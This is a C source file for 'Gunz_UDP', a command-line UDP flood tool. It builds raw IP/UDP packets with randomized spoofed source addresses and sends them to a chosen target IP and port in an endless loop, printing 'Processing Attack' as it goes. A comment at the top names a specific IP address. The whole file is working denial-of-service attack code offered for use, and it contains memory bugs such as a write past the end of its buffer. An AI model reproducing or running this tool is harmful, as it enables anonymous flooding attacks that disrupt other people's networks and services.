//shanghai xiangyang 222.66.2.235
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <sys/types.h>
#include <time.h>
#include <signal.h>


typedef struct  
{  
	uint8_t ip_hl:4;//版本  
	uint8_t ip_v:4; //首部
	uint8_t ip_tos;  //服务类型
	uint16_t ip_len;  //总长度
	uint16_t ip_id;  //标志位
	uint16_t ip_off;  //片位移
	uint8_t ip_ttl;  //生存时间
	uint8_t ip_p;  //协议
	uint16_t ip_sum; // 首部校验和
	uint32_t ip_src;  //源IP
	uint32_t ip_dst;  // 目标IP
} __attribute__ ((packed)) IpHeader; //紧凑型,IP首部 
      
typedef struct  
{  
	uint16_t source;  
	uint16_t dest;  
	uint16_t len;  
	uint16_t check;  
} __attribute__ ((packed)) UdpHeader;  //UDP首部
      
typedef struct  
{ 
	uint32_t src_ip;  
	uint32_t dst_ip;  
	uint8_t zero;  //0
	uint8_t protocol;  //17
	uint16_t udp_len;  
} __attribute__ ((packed)) PseudoUdpHeader;  //伪首部

static uint16_t CalcChecksum(void *data, size_t len)  
{  
        uint16_t *p = (uint16_t *)data;  
        size_t left = len;  
        uint32_t sum = 0;  
        while (left > 1) {  
            sum += *p++;  
            left -= sizeof(uint16_t);  
        }  
        if (left == 1) {  
            sum += *(uint8_t *)p;  
        }  
        sum = (sum >> 16) + (sum & 0xFFFF);  
        sum += (sum >> 16);  
        return sum;  
}  

struct UDPSender
{
	int pack_num;
};

int SendFakeUdp(const void *msg, int len, const char *src_ip, uint16_t src_port, const char *dst_ip, uint16_t dst_port)  
{  
	
        if (!msg || len <= 0 || !dst_ip) {  
            perror("Wrong caught");exit(1);  
        }  
      
        static int fd = -1;  
        if (fd == -1) {  
            if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {  
                perror("Wrong caught");exit(2);  
            }  
            int on = 1;  
            if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1) { 
		perror("Wrong caught"); 
                close(fd);  
                fd = -1;  
                exit(3);  
            }  
        }  
      
        static char buf[65536];  
        IpHeader *ip_header = (IpHeader *)buf;  
        UdpHeader *udp_header = (UdpHeader *)(ip_header + 1);  
        char *data = (char *)(udp_header + 1);  
        PseudoUdpHeader *pseudo_header = (PseudoUdpHeader *)((char *)udp_header - sizeof(PseudoUdpHeader));  
        if (sizeof(*ip_header) + sizeof(*udp_header) + len + len % 2 > sizeof(buf)) {  
            perror("Wrong caught"); exit(4);  
        }  
      	
	srand((unsigned)time(NULL)*99999999999999);
	int t = rand()%100;
	srand((unsigned)time(NULL)*t);
        uint32_t src_ip_v = rand() % 4294967296;  
       // if (inet_pton(AF_INET, src_ip, &src_ip_v) <= 0) {  
       //     perror("Wrong caught"); exit(5); 
       // }  

        uint32_t dst_ip_v = 0;  
        if (inet_pton(AF_INET, dst_ip, &dst_ip_v) <= 0) {  
            perror("Wrong caught"); exit(6); 
        }  
      
        uint16_t udp_len = sizeof(*udp_header) + len;  
        uint16_t total_len = sizeof(*ip_header) + sizeof(*udp_header) + len;  
      
        pseudo_header->src_ip = src_ip_v;  
        pseudo_header->dst_ip = dst_ip_v;  
        pseudo_header->zero = 0;  
        pseudo_header->protocol = IPPROTO_UDP;  
        pseudo_header->udp_len = htons(udp_len);  
      
        udp_header->source = htons(src_port);  
        udp_header->dest = htons(dst_port);  
        udp_header->len = htons(sizeof(*udp_header) + len);  
        udp_header->check = 0;  
      
        memcpy(data, msg, len);  
      
        size_t udp_check_len = sizeof(*pseudo_header) + sizeof(*udp_header) + len;  
        if (len % 2 != 0) {  
            udp_check_len += 1;  
            *(data + len) = 0;  
        }  
        udp_header->check = CalcChecksum(pseudo_header, udp_check_len);  
      
        ip_header->ip_hl = sizeof(*ip_header) / sizeof (uint32_t);  
        ip_header->ip_v = 4;  
        ip_header->ip_tos = 0;  
        ip_header->ip_len = htons(total_len);  
        ip_header->ip_id = htons(0); //为0，协议栈自动设置  
        ip_header->ip_off = htons(0);  
        ip_header->ip_ttl = 255;  
        ip_header->ip_p = IPPROTO_UDP;  
        ip_header->ip_src = src_ip_v;  
        ip_header->ip_dst = dst_ip_v;  
        ip_header->ip_sum = 0;  
      
        //协议栈总是自动计算与填充  
  
        struct sockaddr_in dst_addr;  
        memset(&dst_addr, 0, sizeof(dst_addr));  
        dst_addr.sin_family = AF_INET;  
        dst_addr.sin_addr.s_addr = dst_ip_v;  
        dst_addr.sin_port = htons(dst_port);  
        if (sendto(fd, buf, total_len, 0, (struct sockaddr *)&dst_addr, sizeof(dst_addr)) != total_len)  {  
            perror("Wrong caught"); exit(7);  
        }  
      
        return 0;  
}  

void help()
{
	printf("Gunz_UDP Version 1.0 Beta @KyleSaysYeah\n");
	printf("\n");
	printf("general useage :Gunz_UDP FAKE_UDP_IP FAKE_PORT TARGET_UDP_IP TARGET_PORT\n");
	printf("	--help	get help infomation\n");
	printf("	-t	transformed fake IP address \n");
}
    
struct hostent *host;
//struct UDPSender sender;
int pack_num=0;

void my_handler(int s)
{
	printf("\n\n-----Sending Abort------\n");
	printf("\n-----Reporting------\n");	
	printf("\n%d Packages Sent\n\n" , pack_num );
	exit(0);
}


int main(int argc , void *argv[] )
{

	if( argc != 4 )
	{ 
		perror( "Useage : Gunz_UDP  [option]  [arguement]\n\"Input Useage --help\" to get help infomation\n" );  
		exit(1);
	}



	char buf[559];
	int status;
	struct UDPSender sender;
	sender.pack_num=0;
	

	printf("Gunz_UDP Version 1.0 Beta @KyleSaysYeah\n");
	printf("Processing Attack\n");
	printf("Package Sending");
	int pnt_p=0;

	struct sigaction sigIntHandler;   
 	sigIntHandler.sa_handler =  my_handler;  
	sigemptyset(&sigIntHandler.sa_mask);  
	sigIntHandler.sa_flags = 0; 
	
	while(1)
	{
		pnt_p++;pnt_p = pnt_p%6;
		for(int pcnt = 0 ; pcnt<pnt_p ; pcnt++ )		
			printf(".");


		for(int cnt=0;cnt<535;cnt++)
			buf[cnt]=rand()%93+33;
		strcat(buf,"This is an attack info!");
		buf[559] ='\0';		

		status = SendFakeUdp( buf , strlen( buf ), NULL , strtoul(argv[1], NULL, 0), argv[2], strtoul(argv[3], NULL, 0));  
		if( status < 0 )
		{
			perror("\nError Caught ");
			exit(3);
		}
		
		pack_num++;
		sigaction(SIGINT, &sigIntHandler, NULL );
			
		for(int pcnt = 0 ; pcnt<pnt_p ; pcnt++ )
			printf("\b");
		for(int pcnt = 0 ; pcnt<pnt_p ; pcnt++ )
			printf(" ");
		for(int pcnt = 0 ; pcnt<pnt_p ; pcnt++ )
			printf("\b");
	}	
	

	close(status);
	exit(0);	

}


